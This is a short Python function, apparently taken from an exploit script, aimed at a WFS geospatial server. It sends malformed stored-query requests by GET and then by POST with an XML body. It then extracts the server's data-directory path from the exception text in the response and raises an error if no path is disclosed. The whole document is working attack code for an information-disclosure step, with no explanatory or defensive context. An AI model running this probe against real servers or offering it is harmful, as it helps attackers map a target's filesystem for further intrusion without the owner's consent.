def discover_data_directory(http, target):
    endpoint = target + "/wfs"
    for index, length in enumerate(ID_LENGTHS):
        identifier = "A" * length
        if index == 0:
            response = http.get(endpoint, params={
                "service": "WFS", "version": "2.0.0",
                "request": "GetFeature", "storedQuery_id": identifier})
        else:
            document = (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<wfs:GetFeature service="WFS" version="2.0.0" '
                'xmlns:wfs="http://www.opengis.net/wfs/2.0">'
                '<wfs:StoredQuery id="%s"/></wfs:GetFeature>' % identifier)
            response = http.post(endpoint, data=document.encode(),
                                 headers={"Content-Type": "application/xml"})
        try:
            root = ET.fromstring(response.content)
            text = "\n".join("".join(n.itertext()) for n in root.iter()
                             if local_name(n.tag) == "ExceptionText")
        except ET.ParseError:
            text = response.text
        suffix = "/wfs/query/" + identifier + ".xml"
        match = re.search(r"(/[^\r\n]+?" + re.escape(suffix) + r")", text)
        if match:
            return match.group(1)[:-len(suffix)]
    raise RuntimeError("the WFS response did not disclose the data-directory path")


